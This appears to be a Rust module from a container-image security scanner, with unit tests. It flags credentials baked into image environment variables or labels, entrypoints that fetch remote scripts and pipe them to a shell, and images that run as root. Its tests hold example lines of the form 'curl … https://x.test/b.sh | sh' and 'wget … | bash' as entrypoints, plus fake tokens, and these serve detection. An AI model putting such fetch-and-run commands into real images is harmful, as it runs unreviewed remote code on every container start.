//! The image's own configuration — what it *declares*, as opposed to what its
//! Dockerfile said.
//!
//! [`crate::analyze::dockerfile`] reads the recipe, which is only available to
//! whoever holds the repository. This reads the artifact, which is available to
//! anyone who can pull it, and that difference is the point: the config is what
//! actually ships. An image built from a Dockerfile you never saw still tells
//! you, in plain JSON, that it runs as root and carries a token.
//!
//! Two of the checks are worth more here than in the recipe:
//!
//! - **a credential in `Env` or `Labels`.** In a Dockerfile it is a mistake
//!   waiting to happen; in a pushed image it is a leaked secret, readable by
//!   everyone with pull access, and no amount of deleting the file later takes it
//!   back out of the config.
//! - **the entrypoint fetching and running remote code.** It is the one
//!   instruction that runs on *every* start of *every* container from the image.
//!
//! The rules are shared with the Dockerfile analyzer rather than restated, so a
//! recipe and the artifact it built can never be judged by different standards.

use serde::Deserialize;
use std::collections::BTreeMap;

use crate::analyze::dockerfile::{looks_like_secret, pipes_to_shell};
use crate::model::{Category, Finding, Severity};

/// A container image's runtime configuration, as every runtime reports it under
/// `image inspect`'s `Config` key.
#[derive(Deserialize, Default, Debug)]
#[serde(rename_all = "PascalCase")]
pub struct Config {
    /// The user the main process runs as. **Absent means root** — there is no
    /// implicit unprivileged default.
    #[serde(default)]
    pub user: String,
    #[serde(default)]
    pub env: Vec<String>,
    #[serde(default)]
    pub entrypoint: Option<Vec<String>>,
    #[serde(default)]
    pub cmd: Option<Vec<String>>,
    #[serde(default)]
    pub labels: Option<BTreeMap<String, String>>,
}

impl Config {
    /// Does the main process run as root?
    ///
    /// An unset `User` is the common case and the dangerous one: nothing defaults
    /// it to an unprivileged account.
    fn runs_as_root(&self) -> bool {
        let u = self.user.trim();
        u.is_empty() || u == "root" || u.split(':').next() == Some("0")
    }

    /// Entrypoint and command joined, the way a shell would see them.
    fn start_command(&self) -> String {
        let mut parts: Vec<&str> = Vec::new();
        for list in [self.entrypoint.as_ref(), self.cmd.as_ref()]
            .into_iter()
            .flatten()
        {
            parts.extend(list.iter().map(String::as_str));
        }
        parts.join(" ")
    }
}

/// Analyze an image's declared configuration. `label` names the image in the
/// report, and `location` is where a reader would go to see it for themselves.
pub fn scan(config: &Config, label: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let mk = |severity: Severity, detail: String| Finding {
        dependency: label.to_string(),
        severity,
        category: Category::SensitiveApi,
        detail,
        location: Some(format!("{label} (image config)")),
        evidence: None,
        enrich_url: None,
    };

    for entry in &config.env {
        let Some((name, value)) = entry.split_once('=') else {
            continue;
        };
        if !looks_like_secret(name) || !is_real_value(value) {
            continue;
        }
        out.push(mk(
            Severity::Critical,
            format!(
                "`{name}` is set in the image's environment, so it ships inside the image and is \
                 readable by anyone who can pull it — rotate it, then pass it at run time"
            ),
        ));
    }

    for (key, value) in config.labels.iter().flatten() {
        if looks_like_secret(key) && is_real_value(value) {
            out.push(mk(
                Severity::Critical,
                format!(
                    "label `{key}` carries a credential, which ships inside the image and is \
                     readable by anyone who can pull it — rotate it"
                ),
            ));
        }
    }

    let start = config.start_command();
    if pipes_to_shell(&start) {
        out.push(mk(
            Severity::High,
            "the image's start command fetches a remote script and pipes it to a shell, so \
             unreviewed code runs on every start of every container from this image"
                .into(),
        ));
    }

    if config.runs_as_root() {
        let how = match config.user.trim().is_empty() {
            true => "no `User` is set, and nothing defaults it to an unprivileged account",
            false => "`User` is root",
        };
        out.push(mk(
            Severity::Low,
            format!(
                "the image's main process runs as root: {how} — a compromise of it starts with \
                 root inside the container"
            ),
        ));
    }

    out
}

/// Is this a real value rather than a placeholder?
///
/// An empty string bakes nothing in, and a `$`-prefixed one is a build argument
/// the builder never substituted — reporting either as a leaked credential is how
/// a check earns a reputation for crying wolf.
fn is_real_value(value: &str) -> bool {
    let v = value.trim().trim_matches(['"', '\'']);
    !v.is_empty() && !v.starts_with('$')
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(json: &str) -> Config {
        serde_json::from_str(json).expect("config")
    }
    fn details(c: &Config) -> Vec<String> {
        scan(c, "image acme/api:1")
            .into_iter()
            .map(|f| f.detail)
            .collect()
    }

    /// The real shape a runtime reports, straight from `image inspect`.
    #[test]
    fn a_leaked_token_in_the_environment_is_critical() {
        let c = cfg(
            r#"{"Env":["PATH=/usr/bin","NPM_TOKEN=npm_live_abc123","APP_ENV=prod"],"User":"app"}"#,
        );
        let f = scan(&c, "image acme/api:1");
        assert_eq!(f.len(), 1, "{:?}", details(&c));
        assert_eq!(f[0].severity, Severity::Critical);
        assert!(f[0].detail.contains("NPM_TOKEN"));
        // `APP_ENV` and `PATH` are ordinary configuration.
        assert!(!f[0].detail.contains("APP_ENV"));
    }

    #[test]
    fn a_credential_in_a_label_counts_too() {
        let c = cfg(
            r#"{"User":"app","Labels":{"io.acme.deploy-key":"ssh-rsa AAAA","org.opencontainers.image.title":"api"}}"#,
        );
        let d = details(&c);
        assert_eq!(d.len(), 1, "{d:?}");
        assert!(d[0].contains("io.acme.deploy-key"), "{d:?}");
    }

    /// A build argument the builder never substituted is not a leaked secret.
    #[test]
    fn placeholders_are_not_credentials() {
        let c =
            cfg(r#"{"User":"app","Env":["NPM_TOKEN=","API_KEY=$BUILD_KEY","DB_PASSWORD=\"\""]}"#);
        assert!(details(&c).is_empty(), "{:?}", details(&c));
    }

    #[test]
    fn a_start_command_that_pipes_remote_code_to_a_shell_is_flagged() {
        let c = cfg(
            r#"{"User":"app","Entrypoint":["/bin/sh","-c","curl -fsSL https://x.test/b.sh | sh"]}"#,
        );
        let d = details(&c);
        assert_eq!(d.len(), 1, "{d:?}");
        assert!(d[0].contains("every start of every container"), "{d:?}");
    }

    /// The entrypoint and the command are one command line; a pipe split across
    /// the two still runs.
    #[test]
    fn entrypoint_and_cmd_are_read_together() {
        let c = cfg(
            r#"{"User":"app","Entrypoint":["/bin/sh","-c"],"Cmd":["wget -qO- https://x.test/b | bash"]}"#,
        );
        assert_eq!(details(&c).len(), 1);
    }

    #[test]
    fn an_unset_user_means_root() {
        // Absent, explicitly root, and the numeric form all count.
        for json in [
            r#"{}"#,
            r#"{"User":"root"}"#,
            r#"{"User":"0"}"#,
            r#"{"User":"0:0"}"#,
        ] {
            let d = details(&cfg(json));
            assert_eq!(d.len(), 1, "{json}: {d:?}");
            assert!(d[0].contains("runs as root"), "{json}: {d:?}");
        }
        // A named user, or a non-zero uid, does not.
        for json in [r#"{"User":"app"}"#, r#"{"User":"1000:1000"}"#] {
            assert!(details(&cfg(json)).is_empty(), "{json}");
        }
    }

    /// A well-built image reports nothing at all.
    #[test]
    fn a_clean_config_is_silent() {
        let c = cfg(
            r#"{"User":"app","Env":["PATH=/usr/bin","APP_ENV=prod"],"Entrypoint":["/usr/bin/api"],"ExposedPorts":{"8080/tcp":{}}}"#,
        );
        assert!(details(&c).is_empty(), "{:?}", details(&c));
    }

    /// Runtimes emit explicit nulls for unset maps; `#[serde(default)]` alone
    /// does not cover that, and a deserialize failure here would silently drop
    /// every config finding.
    #[test]
    fn explicit_nulls_deserialize() {
        let c =
            cfg(r#"{"User":"app","Labels":null,"Cmd":null,"Entrypoint":null,"ExposedPorts":null}"#);
        assert!(details(&c).is_empty());
    }
}
